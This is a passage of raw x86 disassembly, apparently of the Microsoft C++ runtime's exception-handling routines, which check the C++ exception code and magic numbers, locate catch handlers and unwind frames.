  430088:	push   0x10
  43008a:	push   0x439708
  43008f:	call   0x431210
  430094:	mov    ebx,DWORD PTR [ebp+0x8]
  430097:	mov    esi,DWORD PTR [ebx+0x8]
  43009a:	mov    DWORD PTR [ebp-0x1c],esi
  43009d:	call   0x433901
  4300a2:	add    eax,0x84
  4300a7:	inc    DWORD PTR [eax]
  4300a9:	and    DWORD PTR [ebp-0x4],0x0
  4300ad:	mov    edi,DWORD PTR [ebp+0x10]
  4300b0:	cmp    esi,DWORD PTR [ebp+0x14]
  4300b3:	je     0x430119
  4300b5:	cmp    esi,0xffffffff
  4300b8:	jle    0x4300bf
  4300ba:	cmp    esi,DWORD PTR [edi+0x4]
  4300bd:	jl     0x4300c4
  4300bf:	call   0x433c22
  4300c4:	mov    eax,esi
  4300c6:	shl    eax,0x3
  4300c9:	mov    ecx,DWORD PTR [edi+0x8]
  4300cc:	add    ecx,eax
  4300ce:	mov    esi,DWORD PTR [ecx]
  4300d0:	mov    DWORD PTR [ebp-0x20],esi
  4300d3:	mov    DWORD PTR [ebp-0x4],0x1
  4300da:	cmp    DWORD PTR [ecx+0x4],0x0
  4300de:	je     0x4300f5
  4300e0:	mov    DWORD PTR [ebx+0x8],esi
  4300e3:	push   0x103
  4300e8:	push   ebx
  4300e9:	mov    ecx,DWORD PTR [edi+0x8]
  4300ec:	push   DWORD PTR [ecx+eax*1+0x4]
  4300f0:	call   0x433c50
  4300f5:	and    DWORD PTR [ebp-0x4],0x0
  4300f9:	jmp    0x430114
  4300fb:	mov    eax,DWORD PTR [ebp-0x14]
  4300fe:	call   0x43006a
  430103:	ret    
  430104:	mov    esp,DWORD PTR [ebp-0x18]
  430107:	and    DWORD PTR [ebp-0x4],0x0
  43010b:	mov    edi,DWORD PTR [ebp+0x10]
  43010e:	mov    ebx,DWORD PTR [ebp+0x8]
  430111:	mov    esi,DWORD PTR [ebp-0x20]
  430114:	mov    DWORD PTR [ebp-0x1c],esi
  430117:	jmp    0x4300b0
  430119:	or     DWORD PTR [ebp-0x4],0xffffffff
  43011d:	call   0x43013b
  430122:	cmp    esi,DWORD PTR [ebp+0x14]
  430125:	je     0x43012c
  430127:	call   0x433c22
  43012c:	mov    DWORD PTR [ebx+0x8],esi
  43012f:	call   0x43124b
  430134:	ret    
  430135:	mov    ebx,DWORD PTR [ebp+0x8]
  430138:	mov    esi,DWORD PTR [ebp-0x1c]
  43013b:	call   0x433901
  430140:	cmp    DWORD PTR [eax+0x84],0x0
  430147:	jle    0x430155
  430149:	call   0x433901
  43014e:	add    eax,0x84
  430153:	dec    DWORD PTR [eax]
  430155:	ret    
  430156:	push   0x8
  430158:	push   0x439720
  43015d:	call   0x431210
  430162:	mov    eax,DWORD PTR [ebp+0x8]
  430165:	test   eax,eax
  430167:	je     0x430184
  430169:	mov    ecx,DWORD PTR [eax+0x1c]
  43016c:	mov    ecx,DWORD PTR [ecx+0x4]
  43016f:	test   ecx,ecx
  430171:	je     0x430184
  430173:	and    DWORD PTR [ebp-0x4],0x0
  430177:	push   ecx
  430178:	push   DWORD PTR [eax+0x18]
  43017b:	call   0x42eccd
  430180:	or     DWORD PTR [ebp-0x4],0xffffffff
  430184:	call   0x43124b
  430189:	ret    
  43018a:	xor    eax,eax
  43018c:	cmp    BYTE PTR [ebp+0xc],al
  43018f:	setne  al
  430192:	ret    
  430193:	mov    esp,DWORD PTR [ebp-0x18]
  430196:	jmp    0x433bed
  43019b:	push   esi
  43019c:	mov    esi,eax
  43019e:	mov    eax,DWORD PTR [ecx]
  4301a0:	add    eax,esi
  4301a2:	cmp    DWORD PTR [ecx+0x4],0x0
  4301a6:	jl     0x4301b8
  4301a8:	mov    edx,DWORD PTR [ecx+0x4]
  4301ab:	mov    ecx,DWORD PTR [ecx+0x8]
  4301ae:	mov    esi,DWORD PTR [edx+esi*1]
  4301b1:	mov    ecx,DWORD PTR [esi+ecx*1]
  4301b4:	add    ecx,edx
  4301b6:	add    eax,ecx
  4301b8:	pop    esi
  4301b9:	ret    
  4301ba:	call   0x433901
  4301bf:	xor    ecx,ecx
  4301c1:	cmp    DWORD PTR [eax+0x84],ecx
  4301c7:	setne  cl
  4301ca:	mov    al,cl
  4301cc:	ret    
  4301cd:	push   0x40
  4301cf:	push   0x439730
  4301d4:	call   0x431210
  4301d9:	mov    ebx,ecx
  4301db:	mov    edi,DWORD PTR [ebp+0xc]
  4301de:	mov    esi,DWORD PTR [ebp+0x8]
  4301e1:	mov    DWORD PTR [ebp-0x20],ebx
  4301e4:	and    DWORD PTR [ebp-0x48],0x0
  4301e8:	mov    eax,DWORD PTR [edi-0x4]
  4301eb:	mov    DWORD PTR [ebp-0x38],eax
  4301ee:	push   DWORD PTR [esi+0x18]
  4301f1:	lea    eax,[ebp-0x50]
  4301f4:	push   eax
  4301f5:	call   0x42ef8a
  4301fa:	pop    ecx
  4301fb:	pop    ecx
  4301fc:	mov    DWORD PTR [ebp-0x3c],eax
  4301ff:	call   0x433901
  430204:	mov    eax,DWORD PTR [eax+0x7c]
  430207:	mov    DWORD PTR [ebp-0x40],eax
  43020a:	call   0x433901
  43020f:	mov    eax,DWORD PTR [eax+0x80]
  430215:	mov    DWORD PTR [ebp-0x44],eax
  430218:	call   0x433901
  43021d:	mov    DWORD PTR [eax+0x7c],esi
  430220:	call   0x433901
  430225:	mov    ecx,DWORD PTR [ebp+0x10]
  430228:	mov    DWORD PTR [eax+0x80],ecx
  43022e:	and    DWORD PTR [ebp-0x4],0x0
  430232:	mov    DWORD PTR [ebp-0x4],0x1
  430239:	push   DWORD PTR [ebp+0x1c]
  43023c:	push   DWORD PTR [ebp+0x18]
  43023f:	push   ebx
  430240:	push   DWORD PTR [ebp+0x14]
  430243:	push   edi
  430244:	call   0x42f01f
  430249:	add    esp,0x14
  43024c:	mov    DWORD PTR [ebp-0x20],eax
  43024f:	and    DWORD PTR [ebp-0x4],0x0
  430253:	jmp    0x430307
  430258:	mov    eax,DWORD PTR [ebp-0x14]
  43025b:	mov    eax,DWORD PTR [eax]
  43025d:	mov    DWORD PTR [ebp-0x1c],eax
  430260:	mov    eax,DWORD PTR [ebp-0x1c]
  430263:	cmp    DWORD PTR [eax],0xe06d7363
  430269:	jne    0x43029c
  43026b:	mov    eax,DWORD PTR [ebp-0x1c]
  43026e:	cmp    DWORD PTR [eax+0x10],0x3
  430272:	jne    0x43029c
  430274:	mov    eax,DWORD PTR [ebp-0x1c]
  430277:	cmp    DWORD PTR [eax+0x14],0x19930520
  43027e:	je     0x43028c
  430280:	mov    eax,DWORD PTR [ebp-0x1c]
  430283:	cmp    DWORD PTR [eax+0x14],0x19930521
  43028a:	jne    0x43029c
  43028c:	mov    eax,DWORD PTR [ebp-0x1c]
  43028f:	cmp    DWORD PTR [eax+0x1c],0x0
  430293:	mov    DWORD PTR [ebp-0x24],0x1
  43029a:	je     0x4302a3
  43029c:	mov    DWORD PTR [ebp-0x24],0x0
  4302a3:	mov    eax,DWORD PTR [ebp-0x24]
  4302a6:	ret    
  4302a7:	mov    esp,DWORD PTR [ebp-0x18]
  4302aa:	mov    ecx,DWORD PTR [ebp+0x14]
  4302ad:	mov    eax,DWORD PTR [ecx+0x8]
  4302b0:	mov    DWORD PTR [ebp-0x30],eax
  4302b3:	mov    edi,DWORD PTR [ebp+0xc]
  4302b6:	mov    eax,DWORD PTR [edi+0x8]
  4302b9:	mov    DWORD PTR [ebp-0x28],eax
  4302bc:	mov    edx,DWORD PTR [ecx+0x10]
  4302bf:	mov    DWORD PTR [ebp-0x2c],edx
  4302c2:	xor    edx,edx
  4302c4:	mov    DWORD PTR [ebp-0x34],edx
  4302c7:	cmp    edx,DWORD PTR [ecx+0xc]
  4302ca:	jae    0x4302f0
  4302cc:	lea    esi,[edx+edx*4]
  4302cf:	mov    ebx,DWORD PTR [ebp-0x2c]
  4302d2:	lea    esi,[ebx+esi*4]
  4302d5:	mov    ebx,DWORD PTR [esi+0x4]
  4302d8:	cmp    eax,ebx
  4302da:	jle    0x430319
  4302dc:	cmp    eax,DWORD PTR [esi+0x8]
  4302df:	jg     0x430319
  4302e1:	lea    eax,[ebx+0x1]
  4302e4:	mov    DWORD PTR [ebp-0x28],eax
  4302e7:	mov    edx,DWORD PTR [ebp-0x30]
  4302ea:	mov    eax,DWORD PTR [edx+eax*8]
  4302ed:	mov    DWORD PTR [ebp-0x28],eax
  4302f0:	push   eax
  4302f1:	push   ecx
  4302f2:	xor    esi,esi
  4302f4:	push   esi
  4302f5:	push   edi
  4302f6:	call   0x430088
  4302fb:	add    esp,0x10
  4302fe:	mov    DWORD PTR [ebp-0x20],esi
  430301:	mov    DWORD PTR [ebp-0x4],esi
  430304:	mov    esi,DWORD PTR [ebp+0x8]
  430307:	or     DWORD PTR [ebp-0x4],0xffffffff
  43030b:	call   0x430322
  430310:	mov    eax,DWORD PTR [ebp-0x20]
  430313:	call   0x43124b
  430318:	ret    
  430319:	inc    edx
  43031a:	jmp    0x4302c4
  43031c:	mov    edi,DWORD PTR [ebp+0xc]
  43031f:	mov    esi,DWORD PTR [ebp+0x8]
  430322:	mov    eax,DWORD PTR [ebp-0x38]
  430325:	mov    DWORD PTR [edi-0x4],eax
  430328:	push   DWORD PTR [ebp-0x3c]
  43032b:	call   0x42efd3
  430330:	pop    ecx
  430331:	call   0x433901
  430336:	mov    ecx,DWORD PTR [ebp-0x40]
  430339:	mov    DWORD PTR [eax+0x7c],ecx
  43033c:	call   0x433901
  430341:	mov    ecx,DWORD PTR [ebp-0x44]
  430344:	mov    DWORD PTR [eax+0x80],ecx
  43034a:	cmp    DWORD PTR [esi],0xe06d7363
  430350:	jne    0x430390
  430352:	cmp    DWORD PTR [esi+0x10],0x3
  430356:	jne    0x430390
  430358:	mov    eax,DWORD PTR [esi+0x14]
  43035b:	cmp    eax,0x19930520
  430360:	je     0x430369
  430362:	cmp    eax,0x19930521
  430367:	jne    0x430390
  430369:	cmp    DWORD PTR [ebp-0x48],0x0
  43036d:	jne    0x430390
  43036f:	cmp    DWORD PTR [ebp-0x20],0x0
  430373:	je     0x430390
  430375:	push   DWORD PTR [esi+0x18]
  430378:	call   0x42efb2
  43037d:	pop    ecx
  43037e:	test   eax,eax
  430380:	je     0x430390
  430382:	call   0x42f122
  430387:	push   eax
  430388:	push   esi
  430389:	call   0x430156
  43038e:	pop    ecx
  43038f:	pop    ecx
  430390:	ret    
  430391:	push   0x8
  430393:	push   0x439748
  430398:	call   0x431210
  43039d:	mov    esi,ecx
  43039f:	mov    eax,DWORD PTR [ebp+0xc]
  4303a2:	mov    edi,edx
  4303a4:	mov    ebx,DWORD PTR [ebp+0x8]
  4303a7:	mov    ecx,DWORD PTR [eax+0x4]
  4303aa:	test   ecx,ecx
  4303ac:	je     0x4304fb
  4303b2:	cmp    BYTE PTR [ecx+0x8],0x0
  4303b6:	je     0x4304fb
  4303bc:	mov    ecx,DWORD PTR [eax+0x8]
  4303bf:	test   ecx,ecx
  4303c1:	jne    0x4303cd
  4303c3:	test   BYTE PTR [eax+0x3],0x80
  4303c7:	je     0x4304fb
  4303cd:	mov    eax,DWORD PTR [eax]
  4303cf:	test   eax,eax
  4303d1:	js     0x4303d7
  4303d3:	lea    edi,[ecx+edi*1+0xc]
  4303d7:	and    DWORD PTR [ebp-0x4],0x0
  4303db:	push   0x1
  4303dd:	push   DWORD PTR [ebx+0x18]
  4303e0:	test   al,0x8
  4303e2:	je     0x430419
  4303e4:	call   0x435980
  4303e9:	pop    ecx
  4303ea:	pop    ecx
  4303eb:	test   eax,eax
  4303ed:	je     0x4304f2
  4303f3:	push   0x1
  4303f5:	push   edi
  4303f6:	call   0x43599c
  4303fb:	pop    ecx
  4303fc:	pop    ecx
  4303fd:	test   eax,eax
  4303ff:	je     0x4304f2
  430405:	mov    eax,DWORD PTR [ebx+0x18]
  430408:	mov    DWORD PTR [edi],eax
  43040a:	lea    ecx,[esi+0x8]
  43040d:	call   0x43019b
  430412:	mov    DWORD PTR [edi],eax
  430414:	jmp    0x4304f7
  430419:	test   BYTE PTR [esi],0x1
  43041c:	je     0x430464
  43041e:	call   0x435980
  430423:	pop    ecx
  430424:	pop    ecx
  430425:	test   eax,eax
  430427:	je     0x4304f2
  43042d:	push   0x1
  43042f:	push   edi
  430430:	call   0x43599c
  430435:	pop    ecx
  430436:	pop    ecx
  430437:	test   eax,eax
  430439:	je     0x4304f2
  43043f:	push   DWORD PTR [esi+0x14]
  430442:	push   DWORD PTR [ebx+0x18]
  430445:	push   edi
  430446:	call   0x42ddb0
  43044b:	add    esp,0xc
  43044e:	cmp    DWORD PTR [esi+0x14],0x4
  430452:	jne    0x4304f7
  430458:	mov    eax,DWORD PTR [edi]
  43045a:	test   eax,eax
  43045c:	je     0x4304f7
  430462:	jmp    0x43040a
  430464:	cmp    DWORD PTR [esi+0x18],0x0
  430468:	jne    0x43049d
  43046a:	call   0x435980
  43046f:	pop    ecx
  430470:	pop    ecx
  430471:	test   eax,eax
  430473:	je     0x4304f2
  430475:	push   0x1
  430477:	push   edi
  430478:	call   0x43599c
  43047d:	pop    ecx
  43047e:	pop    ecx
  43047f:	test   eax,eax
  430481:	je     0x4304f2
  430483:	push   DWORD PTR [esi+0x14]
  430486:	lea    ecx,[esi+0x8]
  430489:	mov    eax,DWORD PTR [ebx+0x18]
  43048c:	call   0x43019b
  430491:	push   eax
  430492:	push   edi
  430493:	call   0x42ddb0
  430498:	add    esp,0xc
  43049b:	jmp    0x4304f7
  43049d:	call   0x435980
  4304a2:	pop    ecx
  4304a3:	pop    ecx
  4304a4:	test   eax,eax
  4304a6:	je     0x4304f2
  4304a8:	push   0x1
  4304aa:	push   edi
  4304ab:	call   0x43599c
  4304b0:	pop    ecx
  4304b1:	pop    ecx
  4304b2:	test   eax,eax
  4304b4:	je     0x4304f2
  4304b6:	push   DWORD PTR [esi+0x18]
  4304b9:	call   0x4359b8
  4304be:	pop    ecx
  4304bf:	test   eax,eax
  4304c1:	je     0x4304f2
  4304c3:	mov    eax,DWORD PTR [ebx+0x18]
  4304c6:	lea    ecx,[esi+0x8]
  4304c9:	test   BYTE PTR [esi],0x4
  4304cc:	je     0x4304e1
  4304ce:	push   0x1
  4304d0:	call   0x43019b
  4304d5:	push   eax
  4304d6:	push   DWORD PTR [esi+0x18]
  4304d9:	push   edi
  4304da:	call   0x42eccd
  4304df:	jmp    0x4304f7
  4304e1:	call   0x43019b
  4304e6:	push   eax
  4304e7:	push   DWORD PTR [esi+0x18]
  4304ea:	push   edi
  4304eb:	call   0x42eccd
  4304f0:	jmp    0x4304f7
  4304f2:	call   0x433c22
  4304f7:	or     DWORD PTR [ebp-0x4],0xffffffff
  4304fb:	call   0x43124b
  430500:	ret    
  430501:	xor    eax,eax
  430503:	inc    eax
  430504:	ret    
  430505:	mov    esp,DWORD PTR [ebp-0x18]
  430508:	jmp    0x433bed
  43050d:	push   ebp
  43050e:	mov    ebp,esp
  430510:	test   ecx,ecx
  430512:	je     0x430521
  430514:	push   ebx
  430515:	push   DWORD PTR [ebp+0x8]
  430518:	mov    edx,esi
  43051a:	call   0x430391
  43051f:	pop    ecx
  430520:	pop    ecx
  430521:	cmp    DWORD PTR [ebp+0x1c],0x0
  430525:	push   DWORD PTR [ebp+0x8]
  430528:	jne    0x43052d
  43052a:	push   esi
  43052b:	jmp    0x430530
  43052d:	push   DWORD PTR [ebp+0x1c]
  430530:	call   0x42ecd4
  430535:	push   DWORD PTR [edi]
  430537:	push   DWORD PTR [ebp+0x14]
  43053a:	push   DWORD PTR [ebp+0x10]
  43053d:	push   esi
  43053e:	call   0x430088
  430543:	mov    eax,DWORD PTR [edi+0x4]
  430546:	push   0x100
  43054b:	push   DWORD PTR [ebp+0x18]
  43054e:	inc    eax
  43054f:	push   DWORD PTR [ebp+0x14]
  430552:	mov    DWORD PTR [esi+0x8],eax
  430555:	push   DWORD PTR [ebp+0xc]
  430558:	mov    ecx,DWORD PTR [ebx+0xc]
  43055b:	push   esi
  43055c:	push   DWORD PTR [ebp+0x8]
  43055f:	call   0x4301cd
  430564:	add    esp,0x28
  430567:	test   eax,eax
  430569:	je     0x430572
  43056b:	push   esi
  43056c:	push   eax
  43056d:	call   0x42ec9d
  430572:	pop    ebp
  430573:	ret    
  430574:	push   ebp
  430575:	mov    ebp,esp
  430577:	push   ecx
  430578:	push   ecx
  430579:	push   esi
  43057a:	mov    esi,DWORD PTR [ebp+0x8]
  43057d:	cmp    DWORD PTR [esi],0x80000003
  430583:	je     0x43062f
  430589:	call   0x433901
  43058e:	cmp    DWORD PTR [eax+0x74],0x0
  430592:	je     0x4305b3
  430594:	push   DWORD PTR [ebp+0x24]
  430597:	push   DWORD PTR [ebp+0x20]
  43059a:	push   DWORD PTR [ebp+0x18]
  43059d:	push   DWORD PTR [ebp+0x14]
  4305a0:	push   DWORD PTR [ebp+0x10]
  4305a3:	push   DWORD PTR [ebp+0xc]
  4305a6:	push   esi
  4305a7:	call   0x42ed97
  4305ac:	add    esp,0x1c
  4305af:	test   eax,eax
  4305b1:	jne    0x43062f
  4305b3:	mov    esi,DWORD PTR [ebp+0x1c]
  4305b6:	push   edi
  4305b7:	lea    eax,[ebp-0x8]
  4305ba:	push   eax
  4305bb:	lea    eax,[ebp-0x4]
  4305be:	push   eax
  4305bf:	push   esi
  4305c0:	push   DWORD PTR [ebp+0x20]
  4305c3:	push   DWORD PTR [ebp+0x18]
  4305c6:	call   0x42ef10
  4305cb:	mov    edi,eax
  4305cd:	mov    eax,DWORD PTR [ebp-0x4]
  4305d0:	add    esp,0x14
  4305d3:	cmp    eax,DWORD PTR [ebp-0x8]
  4305d6:	jae    0x43062e
  4305d8:	push   ebx
  4305d9:	cmp    esi,DWORD PTR [edi]
  4305db:	jl     0x43061f
  4305dd:	cmp    esi,DWORD PTR [edi+0x4]
  4305e0:	jg     0x43061f
  4305e2:	mov    eax,DWORD PTR [edi+0xc]
  4305e5:	mov    ecx,DWORD PTR [edi+0x10]
  4305e8:	shl    eax,0x4
  4305eb:	add    eax,ecx
  4305ed:	mov    ecx,DWORD PTR [eax-0xc]
  4305f0:	test   ecx,ecx
  4305f2:	je     0x4305fa
  4305f4:	cmp    BYTE PTR [ecx+0x8],0x0
  4305f8:	jne    0x43061f
  4305fa:	push   DWORD PTR [ebp+0x24]
  4305fd:	mov    esi,DWORD PTR [ebp+0xc]
  430600:	push   DWORD PTR [ebp+0x20]
  430603:	lea    ebx,[eax-0x10]
  430606:	push   DWORD PTR [ebp+0x18]
  430609:	xor    ecx,ecx
  43060b:	push   DWORD PTR [ebp+0x14]
  43060e:	push   DWORD PTR [ebp+0x10]
  430611:	push   DWORD PTR [ebp+0x8]
  430614:	call   0x43050d
  430619:	mov    esi,DWORD PTR [ebp+0x1c]
  43061c:	add    esp,0x18
  43061f:	inc    DWORD PTR [ebp-0x4]
  430622:	mov    eax,DWORD PTR [ebp-0x4]
  430625:	add    edi,0x14
  430628:	cmp    eax,DWORD PTR [ebp-0x8]
  43062b:	jb     0x4305d9
  43062d:	pop    ebx
  43062e:	pop    edi
  43062f:	pop    esi
  430630:	leave  
  430631:	ret    
  430632:	push   ebp
  430633:	mov    ebp,esp
  430635:	sub    esp,0x24
  430638:	mov    eax,DWORD PTR [ebp+0xc]
  43063b:	mov    eax,DWORD PTR [eax+0x8]
  43063e:	cmp    eax,0xffffffff
  430641:	mov    BYTE PTR [ebp-0x1],0x0
  430645:	mov    DWORD PTR [ebp-0x1c],eax
  430648:	jl     0x430652
  43064a:	mov    ecx,DWORD PTR [ebp+0x18]
  43064d:	cmp    eax,DWORD PTR [ecx+0x4]
  430650:	jl     0x430657
  430652:	call   0x433c22
  430657:	push   ebx
  430658:	mov    ebx,DWORD PTR [ebp+0x8]
  43065b:	cmp    DWORD PTR [ebx],0xe06d7363
  430661:	push   esi
  430662:	push   edi
  430663:	jne    0x43080b
  430669:	cmp    DWORD PTR [ebx+0x10],0x3
  43066d:	mov    edi,0x19930520
  430672:	jne    0x4306ff
  430678:	mov    eax,DWORD PTR [ebx+0x14]
  43067b:	cmp    eax,edi
  43067d:	je     0x430686
  43067f:	cmp    eax,0x19930521
  430684:	jne    0x4306ff
  430686:	cmp    DWORD PTR [ebx+0x1c],0x0
  43068a:	jne    0x4306ff
  43068c:	call   0x433901
  430691:	cmp    DWORD PTR [eax+0x7c],0x0
  430695:	je     0x430803
  43069b:	call   0x433901
  4306a0:	mov    esi,DWORD PTR [eax+0x7c]
  4306a3:	mov    DWORD PTR [ebp+0x8],esi
  4306a6:	call   0x433901
  4306ab:	mov    eax,DWORD PTR [eax+0x80]
  4306b1:	push   0x1
  4306b3:	push   esi
  4306b4:	mov    DWORD PTR [ebp+0x10],eax
  4306b7:	mov    BYTE PTR [ebp-0x1],0x1
  4306bb:	call   0x435980
  4306c0:	test   eax,eax
  4306c2:	pop    ecx
  4306c3:	pop    ecx
  4306c4:	jne    0x4306cb
  4306c6:	call   0x433c22
  4306cb:	cmp    DWORD PTR [esi],0xe06d7363
  4306d1:	jne    0x430808
  4306d7:	mov    eax,DWORD PTR [ebp+0x8]
  4306da:	cmp    DWORD PTR [eax+0x10],0x3
  4306de:	jne    0x4306fc
  4306e0:	mov    eax,DWORD PTR [eax+0x14]
  4306e3:	cmp    eax,edi
  4306e5:	je     0x4306ee
  4306e7:	cmp    eax,0x19930521
  4306ec:	jne    0x4306fc
  4306ee:	mov    eax,DWORD PTR [ebp+0x8]
  4306f1:	cmp    DWORD PTR [eax+0x1c],0x0
  4306f5:	jne    0x4306fc
  4306f7:	call   0x433c22
  4306fc:	mov    ebx,DWORD PTR [ebp+0x8]
  4306ff:	cmp    DWORD PTR [ebx],0xe06d7363
  430705:	jne    0x43080b
  43070b:	cmp    DWORD PTR [ebx+0x10],0x3
  43070f:	jne    0x43080b
  430715:	mov    eax,DWORD PTR [ebx+0x14]
  430718:	cmp    eax,edi
  43071a:	je     0x430727
  43071c:	cmp    eax,0x19930521
  430721:	jne    0x43080b
  430727:	mov    esi,DWORD PTR [ebp-0x1c]
  43072a:	lea    eax,[ebp-0x20]
  43072d:	push   eax
  43072e:	lea    eax,[ebp-0xc]
  430731:	push   eax
  430732:	push   esi
  430733:	push   DWORD PTR [ebp+0x20]
  430736:	push   DWORD PTR [ebp+0x18]
  430739:	call   0x42ef10
  43073e:	mov    ecx,DWORD PTR [ebp-0xc]
  430741:	add    esp,0x14
  430744:	cmp    ecx,DWORD PTR [ebp-0x20]
  430747:	mov    DWORD PTR [ebp-0x8],eax
  43074a:	jae    0x4307f3
  430750:	jmp    0x430755
  430752:	mov    esi,DWORD PTR [ebp-0x1c]
  430755:	cmp    DWORD PTR [eax],esi
  430757:	jg     0x4307de
  43075d:	cmp    esi,DWORD PTR [eax+0x4]
  430760:	jg     0x4307de
  430762:	mov    ecx,DWORD PTR [eax+0xc]
  430765:	test   ecx,ecx
  430767:	mov    esi,DWORD PTR [eax+0x10]
  43076a:	mov    DWORD PTR [ebp-0x18],ecx
  43076d:	jle    0x4307de
  43076f:	mov    ecx,DWORD PTR [ebx+0x1c]
  430772:	mov    ecx,DWORD PTR [ecx+0xc]
  430775:	lea    edx,[ecx+0x4]
  430778:	mov    ecx,DWORD PTR [ecx]
  43077a:	test   ecx,ecx
  43077c:	mov    DWORD PTR [ebp-0x10],edx
  43077f:	mov    DWORD PTR [ebp-0x14],ecx
  430782:	jle    0x4307a8
  430784:	mov    eax,DWORD PTR [ebp-0x10]
  430787:	mov    edi,DWORD PTR [eax]
  430789:	push   DWORD PTR [ebx+0x1c]
  43078c:	mov    DWORD PTR [ebp-0x24],edi
  43078f:	call   0x43001b
  430794:	test   eax,eax
  430796:	pop    ecx
  430797:	jne    0x4307b6
  430799:	dec    DWORD PTR [ebp-0x14]
  43079c:	add    DWORD PTR [ebp-0x10],0x4
  4307a0:	cmp    DWORD PTR [ebp-0x14],eax
  4307a3:	jg     0x430784
  4307a5:	mov    eax,DWORD PTR [ebp-0x8]
  4307a8:	dec    DWORD PTR [ebp-0x18]
  4307ab:	add    esi,0x10
  4307ae:	cmp    DWORD PTR [ebp-0x18],0x0
  4307b2:	jg     0x43076f
  4307b4:	jmp    0x4307de
  4307b6:	push   DWORD PTR [ebp+0x24]
  4307b9:	mov    edi,DWORD PTR [ebp-0x8]
  4307bc:	push   DWORD PTR [ebp+0x20]
  4307bf:	mov    ecx,DWORD PTR [ebp-0x24]
  4307c2:	push   DWORD PTR [ebp+0x18]
  4307c5:	push   DWORD PTR [ebp+0x14]
  4307c8:	push   DWORD PTR [ebp+0x10]
  4307cb:	push   ebx
  4307cc:	mov    ebx,esi
  4307ce:	mov    esi,DWORD PTR [ebp+0xc]
  4307d1:	call   0x43050d
  4307d6:	mov    ebx,DWORD PTR [ebp+0x8]
  4307d9:	add    esp,0x18
  4307dc:	mov    eax,edi
  4307de:	inc    DWORD PTR [ebp-0xc]
  4307e1:	mov    ecx,DWORD PTR [ebp-0xc]
  4307e4:	add    eax,0x14
  4307e7:	cmp    ecx,DWORD PTR [ebp-0x20]
  4307ea:	mov    DWORD PTR [ebp-0x8],eax
  4307ed:	jb     0x430752
  4307f3:	cmp    BYTE PTR [ebp+0x1c],0x0
  4307f7:	je     0x430803
  4307f9:	push   0x1
  4307fb:	push   ebx
  4307fc:	call   0x430156
  430801:	pop    ecx
  430802:	pop    ecx
  430803:	pop    edi
  430804:	pop    esi
  430805:	pop    ebx
  430806:	leave  
  430807:	ret    
  430808:	mov    ebx,DWORD PTR [ebp+0x8]
  43080b:	cmp    BYTE PTR [ebp+0x1c],0x0
  43080f:	jne    0x430831
  430811:	push   DWORD PTR [ebp+0x24]
  430814:	push   DWORD PTR [ebp+0x20]
  430817:	push   DWORD PTR [ebp-0x1c]
  43081a:	push   DWORD PTR [ebp+0x18]
  43081d:	push   DWORD PTR [ebp+0x14]
  430820:	push   DWORD PTR [ebp+0x10]
  430823:	push   DWORD PTR [ebp+0xc]
  430826:	push   ebx
  430827:	call   0x430574
  43082c:	add    esp,0x20
  43082f:	jmp    0x430803
  430831:	jmp    0x433bed
  430836:	push   ebp
  430837:	mov    ebp,esp
  430839:	push   esi
  43083a:	mov    esi,DWORD PTR [ebp+0x18]
  43083d:	mov    eax,DWORD PTR [esi]
  43083f:	push   edi
  430840:	and    eax,0x1fffffff
  430845:	mov    edi,0x19930520
  43084a:	cmp    eax,edi
  43084c:	je     0x430853
  43084e:	call   0x433c22
  430853:	mov    eax,DWORD PTR [ebp+0x8]
  430856:	test   BYTE PTR [eax+0x4],0x66
  43085a:	je     0x43087b
  43085c:	cmp    DWORD PTR [esi+0x4],0x0
  430860:	je     0x4308d1
  430862:	cmp    DWORD PTR [ebp+0x1c],0x0
  430866:	jne    0x4308d1
  430868:	push   0xffffffff
  43086a:	push   esi
  43086b:	push   DWORD PTR [ebp+0x14]
  43086e:	push   DWORD PTR [ebp+0xc]
  430871:	call   0x430088
  430876:	add    esp,0x10
  430879:	jmp    0x4308d1
  43087b:	cmp    DWORD PTR [esi+0xc],0x0
  43087f:	je     0x4308d1
  430881:	cmp    DWORD PTR [eax],0xe06d7363
  430887:	jne    0x4308b5
  430889:	cmp    DWORD PTR [eax+0x14],edi
  43088c:	jbe    0x4308b5
  43088e:	mov    ecx,DWORD PTR [eax+0x1c]
  430891:	mov    ecx,DWORD PTR [ecx+0x8]
  430894:	test   ecx,ecx
  430896:	je     0x4308b5
  430898:	movzx  edx,BYTE PTR [ebp+0x24]
  43089c:	push   edx
  43089d:	push   DWORD PTR [ebp+0x20]
  4308a0:	push   DWORD PTR [ebp+0x1c]
  4308a3:	push   esi
  4308a4:	push   DWORD PTR [ebp+0x14]
  4308a7:	push   DWORD PTR [ebp+0x10]
  4308aa:	push   DWORD PTR [ebp+0xc]
  4308ad:	push   eax
  4308ae:	call   ecx
  4308b0:	add    esp,0x20
  4308b3:	jmp    0x4308d4
  4308b5:	push   DWORD PTR [ebp+0x20]
  4308b8:	push   DWORD PTR [ebp+0x1c]
  4308bb:	push   DWORD PTR [ebp+0x24]
  4308be:	push   esi
  4308bf:	push   DWORD PTR [ebp+0x14]
  4308c2:	push   DWORD PTR [ebp+0x10]
  4308c5:	push   DWORD PTR [ebp+0xc]
  4308c8:	push   eax
  4308c9:	call   0x430632
  4308ce:	add    esp,0x20
  4308d1:	xor    eax,eax
  4308d3:	inc    eax
  4308d4:	pop    edi
  4308d5:	pop    esi
  4308d6:	pop    ebp
  4308d7:	ret    
  4308d8:	push   0x10
  4308da:	push   0x439758
  4308df:	call   0x431210
  4308e4:	call   0x435b38
  4308e9:	mov    DWORD PTR [ebp-0x1c],eax
  4308ec:	test   eax,eax
  4308ee:	jne    0x4308ff
  4308f0:	call   0x432878
  4308f5:	mov    DWORD PTR [eax],0x18
  4308fb:	xor    eax,eax
  4308fd:	jmp    0x430924
  4308ff:	and    DWORD PTR [ebp-0x4],0x0
  430903:	push   eax
  430904:	push   DWORD PTR [ebp+0x10]
  430907:	push   DWORD PTR [ebp+0xc]
  43090a:	push   DWORD PTR [ebp+0x8]
  43090d:	call   0x4359d0
  430912:	add    esp,0x10
  430915:	mov    DWORD PTR [ebp-0x20],eax
  430918:	or     DWORD PTR [ebp-0x4],0xffffffff
  43091c:	call   0x43092a
  430921:	mov    eax,DWORD PTR [ebp-0x20]
  430924:	call   0x43124b
  430929:	ret    
  43092a:	push   DWORD PTR [ebp-0x1c]
  43092d:	call   0x42f407
  430932:	pop    ecx
  430933:	ret    
  430934:	push   0x40
  430936:	push   DWORD PTR [esp+0xc]
  43093a:	push   DWORD PTR [esp+0xc]
  43093e:	call   0x4308d8
  430943:	add    esp,0xc
  430946:	ret    
  430947:	push   0x38
  430949:	push   0x439768
  43094e:	call   0x431210
  430953:	xor    ebx,ebx
